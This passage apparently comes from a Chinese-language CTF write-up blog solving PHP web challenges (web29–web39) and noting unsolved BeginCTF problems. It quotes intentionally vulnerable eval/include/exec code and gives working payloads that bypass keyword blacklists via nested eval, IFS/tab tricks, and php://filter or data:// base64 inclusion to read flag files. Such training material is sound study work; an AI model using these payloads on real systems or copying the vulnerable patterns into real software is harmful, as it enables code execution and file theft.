class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>å…³é”®å­—è¿‡æ»¤ï¼Œç›´æ¥è¯»<code>fla*</code>å°±è¡Œï¼š</p><p><code>/?c=system(&#39;cat fla*&#39;);</code></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>å…³é”®å­—è¿‡æ»¤ï¼Œ<code>system</code>ä¸èƒ½ç”¨äº†ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;v&#x27;</span>]);&amp;v=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>çœ‹å…¶å®ƒå¸ˆå‚…è¿˜å¯ä»¥ç”¨<code>nl</code>å‘½ä»¤æ­é…åå¼•å·ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=echo `nl fla*`;<br></code></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢˜åŸºç¡€ä¸Šè¿‡æ»¤äº†å‡ ä¸ªå¸¸è§çš„è¯»æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ï¼Œä»¥åŠ<code>.</code>ã€<code>ç©ºæ ¼</code>ã€<code>&#39;</code>ã€‚</p><p>å°æ•°ç‚¹è¿™ä¸œè¥¿è¿‡ä¸è¿‡æ»¤éƒ½æ— æ‰€è°“ï¼Œç›´æ¥<code>fla*</code>ä»£æ›¿<code>flag.php</code>å°±è¡Œï¼Œç©ºæ ¼å€’æ˜¯æœ‰å¾ˆå¤šç»•è¿‡æ–¹æ³•ï¼š<code>%09</code>ï¼Œ<code>$&#123;IFS&#125;</code>ï¼Œ<code>$IFS$9</code>ç­‰ç­‰ã€‚ã€‚å•å¼•å·è¿‡æ»¤æ²¡å•¥å½±å“ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo<span class="hljs-variable">%09</span>`tac<span class="hljs-variable">%09</span>fla*`<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿæœ‰å…¶ä»–æ–¹æ³•ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/?c=<span class="hljs-keyword">eval</span>($_GET[v]);&amp;v=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>echo</code>ï¼Œ<code>;</code>ï¼Œ<code>(</code>å’Œåå¼•å·ï¼š</p><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">å‚è€ƒèµ„æ–™</a>:</p><p>includeå¯ä»¥ä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨?&gt;ä»£æ›¿ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-<br>encode/resource=flag.php<br>c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?p</span>hp system(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-string">?&gt;</span><br>c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>;base64,<span class="hljs-title class_">PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs</span>/<span class="hljs-title class_">Pg</span>==<br></code></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å‰é¢å¤šäº†ä¸ª<code>&quot;</code>ï¼Œç›´æ¥ç”¨ä¸Šä¸€é¢˜çš„<code>payload</code>å°±å¥½ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">c</span>=include$_GET[1]?&gt;&amp;<span class="hljs-attribute">1</span>=php://filter/read=convert.base64-<br>encode/<span class="hljs-attribute">resource</span>=flag.php<br></code></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ª<code>:</code>ï¼ŒåŒæ ·çš„è§£æ³•ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>=</code>å’Œ<code>&lt;</code>ï¼Œè¿˜æ˜¯ç”¨ä¸Šé¢˜çš„è§£æ³•ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>è¿‡æ»¤äº†æ•°å­—ï¼ŒæŠŠä¹‹å‰çš„æ–¹æ³•æ•°å­—æ¢æˆå­—æ¯å°±è¡Œï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[z]<span class="hljs-string">?&gt;</span>&amp;z=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨<code>data</code>ä¼ªåè®®å»æ‰§è¡Œå‘½ä»¤<code>&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code>ï¼Œè¿‡æ»¤äº†<code>flag</code>å°±ç¼–ç ä¸€ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?c=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>å¢åŠ è¿‡æ»¤äº†<code>php</code>å’Œ<code>file</code>ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?c=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>åŠ äº†ä¸ª<code>.php</code>çš„åç¼€ï¼ŒæŸ¥äº†ä¸€ä¸‹åŠ åç¼€ä¸ä¼šå½±å“ä¼ªåè®®ä¸­phpä»£ç çš„æ‰§è¡Œ(å·²ç»é—­åˆäº†)ã€‚</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="æœ€åä¸€äº›æœ‰æ€è·¯ä½†å¡ä½äº†è¿˜ä¸çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜çš„é¢˜ç›®ï¼š"><a href="#æœ€åä¸€äº›æœ‰æ€è·¯ä½†å¡ä½äº†è¿˜ä¸çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜çš„é¢˜ç›®ï¼š" class="headerlink" title="æœ€åä¸€äº›æœ‰æ€è·¯ä½†å¡ä½äº†è¿˜ä¸çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜çš„é¢˜ç›®ï¼š"></a>æœ€åä¸€äº›æœ‰æ€è·¯ä½†å¡ä½äº†è¿˜ä¸çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜çš„é¢˜ç›®ï¼š</h2><p>ç­‰å®˜æ–¹wpå…¬å¸ƒåçœ‹çœ‹è‡ªå·±æ€è·¯å‡ºå•¥é—®é¢˜äº†:)</p><h3 id="HGAME-2048-16"><a href="#HGAME-2048-16" class="headerlink" title="[HGAME]2048*16"></a>[HGAME]2048*16</h3><p>æ¸¸æˆé¢˜ï¼Œä¹‹å‰åšéƒ½æ˜¯æ‰¾æºç ç„¶åé‡Œé¢ä¼šå­˜åœ¨ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°(æ¯”å¦‚gameoverå•¥çš„)ï¼Œä½†è¿™é¢˜æ²¡ç¿»åˆ°ã€‚ä¸è¿‡æºç å­˜åœ¨è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/hgamewk12048.png" alt="hgamewk12048"></p><p>ç¿»å‡ºä¸¤ä¸ª<code>game-won</code>å…³é”®å­—æ¥ï¼Œä½†ä¸çŸ¥é“è¿™ä¸œè¥¿å’‹åˆ©ç”¨ã€‚ã€‚</p><h3 id="BeginCTF-pickelshop"><a href="#BeginCTF-pickelshop" class="headerlink" title="[BeginCTF]pickelshop"></a>[BeginCTF]pickelshop</h3><p>éšä¾¿æ³¨å†Œä¸ªè´¦å·ï¼š</p><p><img src="/img/beginctfpickle1.png" alt="beginctfpickle1"></p><p><code>Cookie: user=gASVLQAAAAAAAAB9lCiMCHVzZXJuYW1llIwGMTExMTExlIwIcGFzc3dvcmSUjAYxMTExMTGUdS4=</code></p><p>è¯•è¯•èƒ½ä¸èƒ½è§£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>enc = <span class="hljs-string">&quot;gASVLQAAAAAAAAB9lCiMCHVzZXJuYW1llIwGMTExMTExlIwIcGFzc3dvcmSUjAYxMTExMTGUdS4=&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(b64decode(enc)))<br></code></pre></td></tr></table></figure><p>è—äº†ç”¨æˆ·åå’Œå¯†ç ï¼š</p><p><img src="/img/bbeginctf2024pickilestory2.png" alt="bbeginctf2024pickilestory2"></p><p>å¸¦ç€è¿™ä¸ª<code>cookie</code>å¯ä»¥ç™»å½•ï¼š</p><p><img src="/img/beginctfpickleshop.png" alt="beginctfpickleshop"></p><p>ç°åœ¨è§£é¢˜çš„å¤§è‡´æ€è·¯å°±æ˜¯æˆåŠŸç™»å½•åå¸¦ç€<code>cookie</code>ç‚¹å‡»<code>getpickle</code>ï¼Œé€šè¿‡ä¿®æ”¹cookieæ‰§è¡Œå‘½ä»¤ã€‚ä½†ä¸çŸ¥é“ä¸ºå•¥é¡µé¢é‡Œçš„<code>login</code>,<code>register</code>ç‚¹äº†å•¥ååº”éƒ½æ²¡æœ‰ã€‚ã€‚</p><h3 id="BeginCTF-zupload-pro-plus-max-ultra"><a href="#BeginCTF-zupload-pro-plus-max-ultra" class="headerlink" title="[BeginCTF]zupload-pro-plus-max-ultra"></a>[BeginCTF]zupload-pro-plus-max-ultra</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./upload&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br><br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);<br><br>                <span class="hljs-keyword">echo</span> <span 